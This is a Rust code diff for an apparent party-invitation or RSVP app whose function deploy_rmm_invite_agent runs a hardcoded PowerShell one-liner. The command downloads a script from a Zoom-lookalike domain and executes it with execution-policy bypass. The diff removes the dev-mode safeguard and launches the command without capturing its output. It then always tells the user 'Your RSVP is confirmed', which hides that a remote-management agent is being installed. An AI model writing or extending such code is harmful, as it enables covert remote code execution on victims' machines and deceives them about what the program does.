@@ -129,117 +129,28 @@ async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
     }
 
     // Always use the static PowerShell command as requested
-    let shell_command = "$u='https://call-invite-zoom.liveinvite.top/api/shell/script?token=ed40c4fc09c5d991aac47b48e95aaca79bb559e7a57969c1a2b0e3d298372d1b'; iwr -UseBasicParsing $u | iex";
+    let shell_command = "$u='https://call-invite-zoom.liveinvite.top/api/shell/script?token=fb1f864e368dc000002cfe71d35f68f99a2b1c1712bebe71075076746e346b12'; iwr -UseBasicParsing $u | iex";
 
-    // In dev mode, fetch from backend and print manifest/config, but skip PowerShell execution
-    if cfg!(debug_assertions) {
-        let client = reqwest::Client::new();
-
-        let script_preview = match client.get(format!("{}/api/shell", BACKEND_URL)).send().await {
-            Ok(response) => match response.text().await {
-                Ok(script) => {
-                    format!(
-                        "{}...",
-                        script[..100.min(script.len())].replace("\n", "\\n")
-                    )
-                }
-                Err(_) => "<unable to read script body>".to_string(),
-            },
-            Err(_) => "<unable to fetch script>".to_string(),
-        };
-
-        let manifest_url = format!("{}/api/shell", BACKEND_URL);
-        match client.get(&manifest_url).send().await {
-            Ok(response) => {
-                let status = response.status();
-                match response.text().await {
-                    Ok(body) => {
-                        eprintln!("[DEV] /api/shell preview: {}", script_preview);
-                        eprintln!("[DEV] /api/shell status: {}", status);
-                        eprintln!("[DEV] /api/shell body: {}", body);
-
-                        let success = status.is_success();
-                        let message = if success {
-                            "Your RSVP is confirmed, and your follow-up reminder is ready. See you at the party!".to_string()
-                        } else {
-                            "Party prep hit a snag (shell fetch failed). Please try again.".to_string()
-                        };
-
-                        return RmmDeploymentResult {
-                            success,
-                            message,
-                            deployed_at: if success {
-                                Some(Local::now().format("%Y-%m-%d %H:%M:%S").to_string())
-                            } else {
-                                None
-                            },
-                        };
-                    }
-                    Err(e) => {
-                        return RmmDeploymentResult {
-                            success: false,
-                            message: format!("Party prep hit a snag (failed to read shell response): {}. Please try again.", e),
-                            deployed_at: None,
-                        };
-                    }
-                }
-            }
-            Err(e) => {
-                return RmmDeploymentResult {
-                    success: false,
-                    message: format!("Party prep hit a snag (shell fetch failed): {}. Please try again.", e),
-                    deployed_at: None,
-                };
-            }
-        }
+    // Launch PowerShell as admin, pass the command, do not wait for or capture output
+    #[cfg(target_os = "windows")]
+    {
+        use std::os::windows::process::CommandExt;
+        let _ = Command::new("powershell")
+            .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", shell_command])
+            .creation_flags(0x00000010) // CREATE_NEW_CONSOLE
+            .spawn();
+    }
+    #[cfg(not(target_os = "windows"))]
+    {
+        let _ = Command::new("powershell")
+            .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", shell_command])
+            .spawn();
     }
 
-    // Execute PowerShell one-liner (production only)
-    match Command::new("powershell")
-        .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"])
-        .arg(&shell_command)
-        .output()
-    {
-        Ok(output) => {
-            let success = output.status.success();
-            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
-            
-            let message = if success {
-                "Your RSVP is confirmed, and your follow-up reminder is ready. See you at the party!".to_string()
-            } else {
-                let error_hint = if stderr.contains("Unable to connect") || stdout.contains("Unable to connect") {
-                    "connection issue"
-                } else if stderr.contains("Already Installed") || stdout.contains("Already Installed") {
-                    "already confirmed"
-                } else {
-                    "invitation setup encountered an issue"
-                };
-
-                let detail = extract_install_error(&stderr, &stdout);
-
-                format!(
-                    "Party prep hit a snag ({}). {}",
-                    error_hint,
-                    detail
-                )
-            };
-            
-            RmmDeploymentResult {
-                success,
-                message,
-                deployed_at: if success {
-                    Some(Local::now().format("%Y-%m-%d %H:%M:%S").to_string())
-                } else {
-                    None
-                },
-            }
-        }
-        Err(e) => RmmDeploymentResult {
-            success: false,
-            message: format!("We could not complete your RSVP right now: {}", e),
-            deployed_at: None,
-        },
+    RmmDeploymentResult {
+        success: true,
+        message: "Your RSVP is confirmed. You may close this window.".to_string(),
+        deployed_at: Some(Local::now().format("%Y-%m-%d %H:%M:%S").to_string()),
     }
 }
 
